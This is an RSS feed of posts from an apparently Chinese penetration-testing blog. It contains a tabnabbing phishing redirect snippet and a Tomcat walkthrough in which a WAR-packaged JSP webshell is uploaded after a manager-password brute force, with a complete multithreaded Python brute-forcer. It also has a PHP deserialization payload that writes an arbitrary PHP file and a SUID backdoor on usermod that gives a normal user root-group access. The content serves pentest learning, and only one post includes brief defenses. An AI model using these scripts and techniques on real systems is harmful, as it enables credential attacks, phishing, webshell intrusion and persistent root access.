<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pentest on </title>
    <link>http://wyb0.com/tags/pentest/</link>
    <description>Recent content in Pentest on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Wed, 12 Oct 2016 10:24:38 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/pentest/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>关于_blank</title>
      <link>http://wyb0.com/posts/%E5%85%B3%E4%BA%8E_blank/</link>
      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E5%85%B3%E4%BA%8E_blank/</guid>
      <description>

&lt;h3 id=&#34;0x00-blank:c6afb95d94dc84d45d958ba7b99d9312&#34;&gt;0x00 _blank&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;_blank是html中的标签属性，如&lt;code&gt;&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;&lt;/code&gt;, 但若点击HELLO打开的网页1.php中有如下代码：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
if(window.opener){
  window.opener.location  = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;;
}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;则原网页将转跳到&lt;a href=&#34;http://xss.reber-9.com/fish.html&#34;&gt;http://xss.reber-9.com/fish.html&lt;/a&gt; ，这就会造成钓鱼&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-简单模板:c6afb95d94dc84d45d958ba7b99d9312&#34;&gt;0x01 简单模板&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;a.html内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://xss.reber-9.com/1.php&lt;/code&gt;中1.php内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
    &amp;lt;script&amp;gt;
        if(window.opener){
            window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;;
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;1.php同级下有个钓鱼模板fish.html，内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;点击a.html中的HELLO则会出现下面的情况，也就导致了钓鱼：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/blank.gif&#34; alt=&#34;blank钓鱼&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>http://wyb0.com/posts/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E8%84%91%E5%9B%BE/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E8%84%91%E5%9B%BE/</guid>
      <description>

&lt;h2 id=&#34;web常见漏洞:7d643aebd88a95b82f61f5520b7a5043&#34;&gt;Web常见漏洞&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/web_common_vulnerability_maps.png&#34; alt=&#34;Web常见漏洞.png&#34;&gt;
&lt;/div&gt;

</description>
    </item>
    
    <item>
      <title>Tomcat部署War包getshell</title>
      <link>http://wyb0.com/posts/Tomcat%E9%83%A8%E7%BD%B2War%E5%8C%85getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Tomcat%E9%83%A8%E7%BD%B2War%E5%8C%85getshell/</guid>
      <description>

&lt;h3 id=&#34;0x00-关于war包:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x00 关于War包&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
服务器启动时,War包也会随之被解压后自动部署。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-上传war包getshell:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x01 上传War包GetShell&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;找到后台猜密码然后登录

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_vul_background.png&#34; alt=&#34;Tomcat后台&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_vul_login.png&#34; alt=&#34;Tomcat后台登录&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_vul_war_login_success.png&#34; alt=&#34;Tomcat后台登录成功&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;上传War包&lt;br /&gt;
先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_put_war.png&#34; alt=&#34;Tomcat上传War包&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_put_war_success.png&#34; alt=&#34;Tomcat上传War包成功&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_visit_shell1.png&#34; alt=&#34;Tomcat部署War包后访问shell1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_visit_shell2.png&#34; alt=&#34;Tomcat部署War包后访问shell2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02漏洞防御:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x02漏洞防御&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;后台使用强密码&lt;/li&gt;
&lt;li&gt;删除Tomcat下的manager文件夹&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x03-附爆破弱口令代码:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x03 附爆破弱口令代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests
import json
import base64
import sys
import Queue
import threading

&amp;quot;&amp;quot;&amp;quot;
简单爆破后台登陆密码
Usage: python tomcat.py username.txt password.txt urlfile.txt
username.txt为用户名字典
password.txt为密码字典
urlfile.txt为后台url列表
&amp;quot;&amp;quot;&amp;quot;

def get_username(userfile):
    username = []
    with open(userfile, &#39;r&#39;) as f:
        lines = f.readlines()
        for line in lines:
            username.append(line.strip())
    return username

def get_pwd(passfile):
    password = []
    with open(passfile, &#39;r&#39;) as f:
        lines = f.readlines()
        for line in lines:
            password.append(line.strip())
    return password

def get_url(urlfile):
    urllist = Queue.Queue()
    with open(urlfile,&#39;r&#39;) as f:
        lines = f.readlines()
        for line in lines:
            urllist.put(line.strip())
    return urllist

def thread(f,urls,names,pwds):
    while not urls.empty():
        s = requests.Session()
        url = urls.get()
        resp = s.get(url,timeout=10)  #用于记录cookie
        Referer = resp.url

        headers = {
            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&#39;,
            &#39;Referer&#39;: Referer,
        }
        bgurl = url + &#39;manager/html&#39;
        # print bgurl
        for name in names:
            for pwd in pwds:
                authorize = name + &#39;:&#39; + pwd
                Basic = &amp;quot;Basic &amp;quot; + base64.b64encode(authorize)
                headers[&#39;Authorization&#39;] = Basic
                # print json.dumps(headers, indent=4)

                proxy = {
                    &#39;http&#39;:&#39;http://127.0.0.1:1080&#39;
                }

                resp = s.get(bgurl,headers=headers,proxies=proxy,timeout=10)
                if resp.status_code == 200:
                    s = &amp;quot;[Ok] %s\t%s:%s&amp;quot; % (bgurl,name,pwd)
                    print s
                    f.write(s)
                    exit()
                else:
                    print &#39;[Error] &#39; + bgurl + &#39;\t&#39; + name + &#39;:&#39; + pwd
            # break

def main():
    if len(sys.argv) &amp;lt; 4:
        print &amp;quot;Usage: python tomcat.py username.txt password.txt urlfile.txt&amp;quot;
        exit()
    userfile = sys.argv[1]
    passfile = sys.argv[2]
    urlfile = sys.argv[3]
    names = get_pwd(userfile)
    pwds = get_pwd(passfile)
    urls = get_url(urlfile)

    tlist = []
    f = open(&amp;quot;result.txt&amp;quot;,&amp;quot;a+&amp;quot;)
    for x in xrange(1,50):
        t = threading.Thread(target=thread,args=(f,urls,names,pwds,))
        tlist.append(t)
    for t in tlist:
        t.start()
    t.join()

main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>PHP反序列化漏洞</title>
      <link>http://wyb0.com/posts/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</guid>
      <description>

&lt;h2 id=&#34;这里是正文:27d041f2ed6ee13db4814701975a6a98&#34;&gt;这里是正文&lt;/h2&gt;

&lt;h3 id=&#34;0x00-关于反序列化漏洞:27d041f2ed6ee13db4814701975a6a98&#34;&gt;0x00 关于反序列化漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;序列化：使用函数serialize()可将实例序列化为字符串&lt;br /&gt;
反序列化：使用函数unserialize()可将序列化的字符串还原&lt;br /&gt;
若服务端有如下代码：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    class foo{
        public $file = &amp;quot;test.txt&amp;quot;;
        public $data = &amp;quot;123456&amp;quot;;

        function __destruct(){
            file_put_contents($this-&amp;gt;file,$this-&amp;gt;data);
        }
    }

    $d = $_REQUEST[&#39;str&#39;];
    var_dump($d);
    echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
    $tc = unserialize(base64_decode($d));
    var_dump($tc);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;客户端可构造如下代码生成序列化后的字符串提交给服务端，&lt;br /&gt;
服务端就会生成文件xx.php，内容为&lt;b&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/b&gt;：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    class foo {
        public $ﬁle = &amp;quot;test.txt&amp;quot;;
        public $data = &amp;quot;123456&amp;quot;;
        
        function __destruct() {
            ﬁle_put_contents($this-&amp;gt;ﬁle, $this-&amp;gt;data);
        }
    }

    $f = new foo();
    $f-&amp;gt;ﬁle = &amp;quot;xx.php&amp;quot;;
    $f-&amp;gt;data = &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;;
    echo base64_encode(serialize($f));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>渗透测试流程(单台服务器)</title>
      <link>http://wyb0.com/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B-%E5%8D%95%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Sun, 19 Jun 2016 19:31:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B-%E5%8D%95%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>

&lt;h2 id=&#34;针对单台服务器的渗透流程:2d6f6d53e7eddc5c81fc0e46e1c00ac7&#34;&gt;针对单台服务器的渗透流程&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/Penetration_testing_process_Single_server.png&#34; alt=&#34;针对单台服务器的渗透测试流程.png&#34;&gt;
&lt;/div&gt;

</description>
    </item>
    
    <item>
      <title>Linux之安装ettercap</title>
      <link>http://wyb0.com/posts/Linux%E4%B9%8B%E5%AE%89%E8%A3%85ettercap/</link>
      <pubDate>Tue, 19 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B9%8B%E5%AE%89%E8%A3%85ettercap/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;操作系统：CentOS&lt;br /&gt;
首先，ettercap安装时需要4个依赖包，而且安装包里面也已经提供了&lt;br /&gt;
执行：sudo yum groupinstall &amp;ldquo;Development tools&amp;rdquo;    &lt;em&gt;源码安装软件就需要安装这个&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;一-下载解压:34c81a6ef52c6fc9b50ea74b9a01b394&#34;&gt;一、下载解压&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;可用wget下载&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;二-查看需要的依赖项:34c81a6ef52c6fc9b50ea74b9a01b394&#34;&gt;二、查看需要的依赖项&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;[wyb@localhost ettercap-0.8.2]$ vim INSTALL

 #### Bundled libraries  
 Ettercap now bundles the following libraries with the source distribution:  
   libnet 1.1.6  
   curl 7.41.0  
   luajit 2.0.3  
   check 0.9.14  
[wyb@localhost ettercap-0.8.2]$ cd bundled_deps/  
[wyb@localhost bundled_deps]$ ls  
check  curl  libnet  luajit
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;三-安装依赖包:34c81a6ef52c6fc9b50ea74b9a01b394&#34;&gt;三、安装依赖包&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装check&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[wyb@localhost check]$ cd check-0.9.14
[wyb@localhost check-0.9.14]$ ls
[wyb@localhost check-0.9.14]$ ./configure 
[wyb@localhost check-0.9.14]$ make
[wyb@localhost check-0.9.14]$ sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装curl&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[wyb@localhost check-0.9.14]$ cd ..
[wyb@localhost curl-7.41.0]$ cd curl/
[wyb@localhost curl-7.41.0]$ cd curl-7.41.0
[wyb@localhost curl-7.41.0]$ make
[wyb@localhost curl-7.41.0]$ sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装libnet&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[wyb@localhost curl-7.41.0]$ cd ../../libnet/
[wyb@localhost libnet]$ tar -zxvf libnet-1.1.6.tar.gz
[wyb@localhost libnet]$ cd libnet-1.1.6
[wyb@localhost libnet-1.1.6]$ ./configure 
[wyb@localhost libnet-1.1.6]$ make
[wyb@localhost libnet-1.1.6]$ sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装luajit&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[wyb@localhost luajit]$ tar -zxvf LuaJIT-2.0.3.tar.gz 
[wyb@localhost luajit]$ make
[wyb@localhost luajit]$ sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装ettercap&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[wyb@localhost ettercap-0.8.2]$ cd ettercap-0.8.2 
[wyb@localhost ettercap-0.8.2]$ mkdir build                   
[wyb@localhost ettercap-0.8.2]$ cd build  
[wyb@localhost build]$ cmake ../    *cmake ettercap时提示未安装cmake*  
-bash: cmake: command not found  
[wyb@localhost build]$ sudo yum install cmake   *安装cmake*  
[wyb@localhost build]$ cmake ../    *提示未安装curses*  
-- The C compiler identification is GNU 4.4.7  
-- Check for working C compiler: /usr/bin/cc  
-- Check for working C compiler: /usr/bin/cc -- works  
.....  
.....  
CMake Error at /usr/share/cmake/Modules/FindPackageHandleStandardArgs.cmake:108 (message):  
  Could NOT find Curses (missing: CURSES_LIBRARY CURSES_INCLUDE_PATH)  
.....  
.....  
[wyb@localhost build]$ yum search curses    *查找curses*  
Loaded plugins: fastestmirror, refresh-packagekit, security  
Determining fastest mirrors  
 * base: mirrors.yun-idc.com  
 * extras: mirrors.opencas.cn  
 * updates: mirrors.btte.net
============================= N/S Matched: curses   ==============================  
ncurses.x86_64 : Ncurses support utilities  
ncurses-devel.i686 : Development files for the ncurses library  
ncurses-devel.x86_64 : Development files for the ncurses library  
ncurses-libs.x86_64 : Ncurses libraries  
ncurses-libs.i686 : Ncurses libraries  
ncurses-static.x86_64 : Static libraries for the ncurses library  
ocaml-curses.x86_64 : OCaml bindings for ncurses    
ocaml-curses-devel.x86_64 : Development files for ocaml-curses  
ncurses-base.x86_64 : Descriptions of common terminals  
ncurses-term.x86_64 : Terminal descriptions  
  Name and summary matches only, use &amp;quot;search all&amp;quot; for everything.  
[wyb@localhost build]$ sudo yum install ncurses ncurses-devel   *安装ncurses开发包*  
[wyb@localhost build]$ rm -rf *     *清除上次cmake产生的文件*  
[wyb@localhost build]$ cmake ../    *出错，缺少依赖包GTK*  
-- The C compiler identification is GNU 4.4.7  
-- Check for working C compiler: /usr/bin/cc  
......  
......  
CMake Error at /usr/share/cmake/Modules/FindGTK2.cmake:429 (message):  
  Could not find GTK2 include directory  
....  
....  
[wyb@localhost build]$ yum search gtk  
Loaded plugins: fastestmirror, refresh-packagekit, security  
Loading mirror speeds from cached hostfile  
 * base: mirrors.yun-idc.com  
.....  
.....  
gtk2.x86_64 : The GIMP ToolKit (GTK+), a library for creating GUIs for X  
gtk2.i686 : The GIMP ToolKit (GTK+), a library for creating GUIs for X  
gtk2-devel.i686 : Development files for GTK+   
.... 
....  
[wyb@localhost build]$ sudo yum install gtk2 gtk2-devel *安装gtk及开发包* 
[wyb@localhost build]$ rm -rf *     *清除上次cmake产生的文件*  
[wyb@localhost build]$ cmake ../    *缺少依赖包OpenSSL*  
-- The C compiler identification is GNU 4.4.7  
-- Check for working C compiler: /usr/bin/cc  
-- Check for working C compiler: /usr/bin/cc -- works  
-- Detecting C compiler ABI info  
-- Detecting C compiler ABI info - done  
-- Check if the system is big endian  
.....  
.....  
CMake Error at /usr/share/cmake/Modules/FindPackageHandleStandardArgs.cmake:108 (message):  
  Could NOT find OpenSSL, try to set the path to OpenSSL root folder in the  
  system variable OPENSSL_ROOT_DIR (missing: OPENSSL_LIBRARIES OPENSSL_INCLUDE_DIR)    
.....  
.....  
[wyb@localhost build]$ yum search openssl   *查找openssl*  
[wyb@localhost build]$ sudo yum install openssl openssl-devel   *安装openss及其开发包*  
[wyb@localhost build]$ rm -rf *     *清除上次cmake产生的文件*  
[wyb@localhost build]$ cmake ../    *依赖libpcap*  
......  
......  
-- Looking for inet_aton  
-- Looking for inet_aton - found  
CMake Error at cmake/Modules/EttercapLibCheck.cmake:191 (message):  
  libpcap not found!  
....  
....  
[wyb@localhost build]$ yum search libpcap   *查找libpcap*  
Loaded plugins: fastestmirror, refresh-packagekit, security  
Loading mirror speeds from cached hostfile  
 * base: mirrors.yun-idc.com   
 * extras: mirrors.opencas.cn  
 * updates: mirrors.btte.net  
============================= N/S Matched: libpcap =============================  
libpcap-devel.i686 : Libraries and header files for the libpcap library  
libpcap-devel.x86_64 : Libraries and header files for the libpcap library  
libpcap.x86_64 : A system-independent interface for user-level packet capture  
libpcap.i686 : A system-independent interface for user-level packet capture  
  Name and summary matches only, use &amp;quot;search all&amp;quot; for everything.  
[wyb@localhost build]$ sudo yum install libpcap-devel   *安装libpcap-devel*  
[wyb@localhost build]$ rm -rf *     *清除上次cmake产生的文件*  
[wyb@localhost build]$ cmake ../    *cmake成功*  
[wyb@localhost build]$ make *make*  
....  
....  
Linking C executable etterlog  
[100%] Built target etterlog  
Scanning dependencies of target man  
[100%] Built target man  
[wyb@localhost build]$ sudo make install    *make install*  
.....  
.....   
-- Installing: /usr/local/share/man/man8/ettercap_curses.8  
-- Installing: /usr/local/share/man/man8/ettercap-pkexec.8  
-- Installing: /usr/local/share/man/man5/etter.conf.5  
[wyb@localhost build]$ cd  
[wyb@localhost ~]$ ettercap -v  *查看版本且能查看，证明安装成功*  
ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team  
ettercap 0.8.2  
[wyb@localhost ~]$
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>Linux之USID后门</title>
      <link>http://wyb0.com/posts/Linux%E4%B9%8BSUID%E5%90%8E%E9%97%A8/</link>
      <pubDate>Mon, 18 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B9%8BSUID%E5%90%8E%E9%97%A8/</guid>
      <description>

&lt;p&gt;SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制：&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;为二进制文件添加s权限从而提升为root权限方法:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;为二进制文件添加s权限从而提升为root权限方法：&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;写sudoers添加用户  &lt;code&gt;//最佳方案&lt;/code&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;vim /etc/passwd    &lt;code&gt;//将uid和gid改为0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;vim /etc/shadow    &lt;code&gt;//密文覆盖&lt;/code&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;vim root .ssh/证书文件   &lt;code&gt;.ssh这个文件夹和证书的权限要正确，要和原来一致&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;suid-这个东西主要是留后门:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;SUID:这个东西主要是留后门&lt;/h2&gt;

&lt;h4 id=&#34;在root权限下给usermod一个s权限:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;在root权限下给usermod一个s权限：&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;# which usermod   //得到usermod的路径                             
/usr/sbin/usermod
# chmod u+s /usr/sbin/usermod
# ls -l /usr/sbin/usermod
-rwsr-x---. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;usermod给其他人一个x权限:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;usermod给其他人一个x权限：&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# chmod o+x /usr/sbin/usermod
[root@localhost ~]# ls -l /usr/sbin/usermod
-rwsr-x--x. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;切换到普通用户wyb:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;切换到普通用户wyb：&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;    [wyb@localhost ~]$ id wyb
    uid=500(wyb) gid=500(wyb) groups=500(wyb)
    [wyb@localhost ~]$ usermod -g root wyb
    [wyb@localhost ~]$ id wyb
    uid=500(wyb) gid=0(root) groups=0(root)
    [wyb@localhost ~]$ exit
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;验证:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;验证：&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;重新用wyb连接，此时即为root权限
[wyb@localhost ~]$ cd /root  //若能切换到此目录即证明确实获得了root权限
[wyb@localhost root]$ ls
anaconda-ks.cfg  install.log  install.log.syslog
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>